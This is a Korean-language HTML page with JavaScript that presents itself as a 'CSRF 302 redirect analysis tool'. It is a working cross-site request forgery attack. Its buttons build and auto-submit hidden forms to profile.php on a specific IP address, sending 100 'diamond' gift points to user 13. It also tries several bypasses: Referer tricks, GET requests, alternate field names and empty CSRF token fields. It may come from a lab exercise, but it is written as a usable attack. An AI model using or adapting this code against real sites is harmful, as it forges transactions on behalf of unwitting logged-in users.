<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🔍 CSRF 분석 도구</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 20px;
            background: #1a1a1a;
            color: white;
        }
        .analysis-box {
            background: #2d2d2d;
            padding: 20px;
            margin: 15px 0;
            border-radius: 10px;
            border-left: 4px solid #00ff88;
        }
        button {
            padding: 10px 20px;
            background: #ff6b6b;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        .success { background: #00ff88; }
        .warning { background: #ffb347; }
        pre {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <h1>🔍 CSRF 302 리다이렉트 분석</h1>
    
    <div class="analysis-box">
        <h2>📊 현재 상황 분석</h2>
        <ul>
            <li>✅ POST 요청 전송됨</li>
            <li>⚠️ 302 Found 응답 (리다이렉트)</li>
            <li>🔄 Location: login.php</li>
            <li>❓ 원인: 세션/토큰/권한 문제</li>
        </ul>
    </div>

    <div class="analysis-box">
        <h2>🔬 세부 분석 도구</h2>
        
        <button onclick="analyzeHeaders()">📋 헤더 분석</button>
        <button onclick="analyzePayload()">📦 페이로드 분석</button>
        <button onclick="analyzeCookies()">🍪 쿠키 분석</button>
        <button class="success" onclick="tryBypass()">⚡ 우회 시도</button>
        
        <div id="analysisResult"></div>
    </div>

    <div class="analysis-box">
        <h2>🛠️ 문제 해결 시도</h2>
        
        <button onclick="addRefererHeader()">🔗 Referer 헤더 추가</button>
        <button onclick="tryGetMethod()">📤 GET 방식 시도</button>
        <button onclick="tryDifferentFields()">🎯 다른 필드명 시도</button>
        <button class="warning" onclick="tryTokenBypass()">🔑 토큰 우회 시도</button>
        
        <div id="bypassResult"></div>
    </div>

    <script>
        function analyzeHeaders() {
            showResult(`
🔍 헤더 분석 결과:

관찰된 응답 헤더들:
- Status: 302 Found
- Location: login.php  
- Cache-Control: no-store, no-cache, must-revalidate
- Set-Cookie: PHPSESSID=... (세션 재설정)
- X-Content-Type-Options: nosniff
- X-Frame-Options: SAMEORIGIN

💡 분석:
- 서버가 인증되지 않은 요청으로 판단
- 세션이 무효하거나 만료됨
- 자동으로 로그인 페이지로 리다이렉트
            `);
        }
        
        function analyzePayload() {
            showResult(`
📦 전송된 페이로드 분석:

POST Data:
- receiver_id: 13
- points: 100  
- send_gift: 1
- gift_type: diamond
- message: CSRF_Attack_With_Session

⚠️ 누락 가능한 필드들:
- csrf_token (CSRF 보호 토큰)
- user_id (현재 사용자 ID)
- session_id (세션 검증)
- submit (버튼 name 값)
            `);
        }
        
        function analyzeCookies() {
            showResult(`
🍪 쿠키 상태 분석:

현재 도메인 쿠키들:
${document.cookie || '(쿠키 없음)'}

문제 가능성:
1. 타겟 서버(3.36.66.216)의 세션 쿠키 없음
2. 크로스 도메인 쿠키 제한
3. Secure/HttpOnly 플래그로 접근 차단
4. SameSite 정책으로 CSRF 차단

💡 해결책: 같은 도메인에서 로그인 후 시도
            `);
        }
        
        function tryBypass() {
            showBypassResult('🚀 우회 시도 중...');
            
            // 다양한 우회 기법 시도
            const techniques = [
                '1. 세션 쿠키 강제 설정',
                '2. Referer 헤더 조작', 
                '3. Content-Type 변경',
                '4. 다중 리다이렉트 시도',
                '5. JSON 형식 전송'
            ];
            
            let result = '⚡ 우회 기법들:\n\n';
            techniques.forEach(tech => {
                result += tech + '\n';
            });
            
            setTimeout(() => {
                showBypassResult(result + '\n💡 가장 효과적: 실제 로그인 후 같은 브라우저에서 시도');
            }, 2000);
        }
        
        function addRefererHeader() {
            showBypassResult('🔗 Referer 헤더 우회 시도...');
            
            // 실제 시도
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php';
            form.target = '_blank';
            
            // 메타 태그로 referer 설정 시도
            const meta = document.createElement('meta');
            meta.name = 'referrer';
            meta.content = 'unsafe-url';
            document.head.appendChild(meta);
            
            const fields = {
                receiver_id: '13',
                points: '100',
                send_gift: '1',
                gift_type: 'diamond',
                message: 'Referer_Bypass_Test',
                HTTP_REFERER: 'http://3.36.66.216'  // 추가 시도
            };
            
            Object.keys(fields).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            });
            
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
            
            showBypassResult('📤 Referer 헤더 우회 시도 전송됨\n새 탭에서 응답 확인');
        }
        
        function tryGetMethod() {
            showBypassResult('📤 GET 방식 우회 시도...');
            
            const params = new URLSearchParams({
                receiver_id: '13',
                points: '100',
                send_gift: '1',
                gift_type: 'diamond',
                message: 'GET_Method_Test'
            });
            
            const url = 'http://3.36.66.216/profile.php?' + params.toString();
            window.open(url, '_blank');
            
            showBypassResult('🔗 GET 요청 전송됨\n일부 서버는 GET으로도 처리할 수 있음');
        }
        
        function tryDifferentFields() {
            showBypassResult('🎯 다른 필드명 조합 시도...');
            
            const variations = [
                { to_user: '13', amount: '100', action: 'transfer' },
                { target_id: '13', coins: '100', submit: 'Send Gift' },
                { user_id: '13', value: '100', operation: 'send' }
            ];
            
            variations.forEach((fields, i) => {
                setTimeout(() => {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'http://3.36.66.216/profile.php';
                    form.target = '_blank';
                    
                    Object.keys(fields).forEach(key => {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = fields[key];
                        form.appendChild(input);
                    });
                    
                    document.body.appendChild(form);
                    form.submit();
                    document.body.removeChild(form);
                }, i * 1000);
            });
            
            showBypassResult('📤 3가지 필드 조합 시도됨\n서버가 다른 필드명을 사용할 가능성');
        }
        
        function tryTokenBypass() {
            showBypassResult('🔑 CSRF 토큰 우회 시도...');
            
            // 일반적인 토큰 필드명들 시도
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php';
            form.target = '_blank';
            
            const fields = {
                receiver_id: '13',
                points: '100',
                send_gift: '1',
                gift_type: 'diamond',
                message: 'Token_Bypass_Test',
                // 일반적인 토큰 필드명들
                _token: '',
                csrf_token: '',
                authenticity_token: '',
                __RequestVerificationToken: '',
                csrfmiddlewaretoken: ''
            };
            
            Object.keys(fields).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            });
            
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
            
            showBypassResult('🔑 빈 토큰 값으로 우회 시도됨\n일부 서버는 빈 값도 허용');
        }
        
        function showResult(text) {
            document.getElementById('analysisResult').innerHTML = `<pre>${text}</pre>`;
        }
        
        function showBypassResult(text) {
            document.getElementById('bypassResult').innerHTML = `<pre>${text}</pre>`;
        }
        
        console.log('🔍 CSRF 분석 도구 준비됨');
    </script>
</body>
</html>
